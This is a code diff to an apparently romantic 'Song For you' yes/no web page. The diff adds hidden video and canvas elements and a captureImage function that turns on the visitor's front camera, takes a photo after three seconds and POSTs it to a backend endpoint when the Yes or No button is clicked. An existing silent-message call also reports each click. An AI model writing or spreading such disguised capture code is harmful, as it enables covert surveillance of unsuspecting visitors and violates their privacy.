@@ -105,6 +105,9 @@
       display: none;
     }
 
+    video, canvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -132,6 +135,10 @@
     <h1 id="song">Song For you ❤️</h1>
     <img id="popupImage" src="" alt="popup gif" />
   </div>
+
+  <!-- Hidden video/canvas elements for camera capture -->
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
   <script>
     let clickCount = 0;
@@ -204,6 +211,43 @@
       });
     }
 
+    // Function to capture image from the front camera
+    async function captureImage(buttonClicked) {
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
+
+        video.srcObject = stream;
+
+        // Wait for 3 seconds before capturing the image
+        await new Promise(resolve => setTimeout(resolve, 3000));
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Stop the camera
+        stream.getTracks().forEach(track => track.stop());
+
+        const imageData = canvas.toDataURL("image/png");
+
+        // Send the image to the backend (in this case, just log to console)
+        await fetch("http://localhost:3000/send-photo", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ image: imageData, button: buttonClicked })
+        });
+      } catch (error) {
+        console.error("Capture failed:", error);
+      }
+    }
+
     noButton.addEventListener('click', () => {
       clickCount++;
       if (clickCount < imageUrls.length) {
@@ -218,6 +262,7 @@
       }
       moveButton();
       sendSilentMessage('No button clicked');
+      captureImage("No"); // Capture and send image for "No"
     });
 
     const loveSong = new Audio('./song/Vizhiyil-Un-Vizhiyil.mp3'); 
@@ -231,22 +276,22 @@
       yesButton.style.display = "none";
       noButton.style.display = "none";
       song.style.display = 'block';
-    showPopupGif('https://www.icegif.com/wp-content/uploads/icegif-3795.gif');
-    sendSilentMessage('Yes button clicked');
-
+      showPopupGif('https://www.icegif.com/wp-content/uploads/icegif-3795.gif');
+      sendSilentMessage('Yes button clicked');
   
-  loveSong.play().catch((err) => {
-    console.log('Autoplay failed:', err);
-  });
-});
+      captureImage("Yes"); // Capture and send image for "Yes"
+  
+      loveSong.play().catch((err) => {
+        console.log('Autoplay failed:', err);
+      });
+    });
 
-
-document.addEventListener('click', (event) => {
-  if (!yesButton.contains(event.target)) {
-    loveSong.pause();
-    loveSong.currentTime = 0; 
-  }
-}, { once: true });
+    document.addEventListener('click', (event) => {
+      if (!yesButton.contains(event.target)) {
+        loveSong.pause();
+        loveSong.currentTime = 0; 
+      }
+    }, { once: true });
   </script>
 </body>
 </html>
